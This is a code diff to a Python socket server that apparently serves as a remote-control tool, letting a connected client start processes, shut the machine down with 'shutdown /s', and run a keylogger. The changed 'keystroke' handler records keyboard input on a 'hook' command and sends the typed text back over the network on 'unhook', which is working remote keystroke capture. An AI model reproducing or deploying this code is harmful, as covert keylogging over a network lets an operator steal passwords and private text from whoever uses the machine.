@@ -27,7 +27,7 @@ def threaded_client(con, addr):
                     con.sendall("start process".encode('utf8'))
                 if req == 'process closing':
                     con.sendall('Received request'.encode('utf8'))
-                    break
+                    break 
         if req == 'app':
             con.sendall("Receveid request".encode('utf8'))
 
@@ -59,21 +59,22 @@ def threaded_client(con, addr):
 
         if req == "keystroke":
             con.sendall("receveived Request".encode("utf8"))
-            req = con.recv(1024).decode("utf8")
-            if req == "hook":
-                keyboard.start_recording() 
-                con.sendall("Hooked".encode("utf8"))
-            req = con.recv(1024).decode("utf8")
-            if req == "unhook":
-                record = keyboard.stop_recording() 
-                con.sendall("Unhooked".encode("utf8"))
-            req = con.recv(1024).decode("utf8")
-            if req == "view":
-                string = next(keyboard.get_typed_strings(record))
-                con.sendall(string.encode("utf8"))
+            while True:
+                req = con.recv(1024).decode("utf8")
+                if req == "hook":
+                    keyboard.start_recording() 
+                    con.sendall("Hooked".encode("utf8"))
+                elif req == "unhook":
+                    record = keyboard.stop_recording() 
+                    string = next(keyboard.get_typed_strings(record))
+                    if string == '':
+                        string = 'nothing hook'
+                    con.sendall(string.encode("utf8"))
+                elif req == 'keystroke closing':
+                    con.sendall('Received request'.encode('utf8'))
+                    break
         if req == "shutdown":
             os.system("shutdown /s")
-
     con.close()
     
 
@@ -94,7 +95,6 @@ def start_server():
             print("Disconnect")
             break
             
-
 
 #server_thread
 def server_thread():
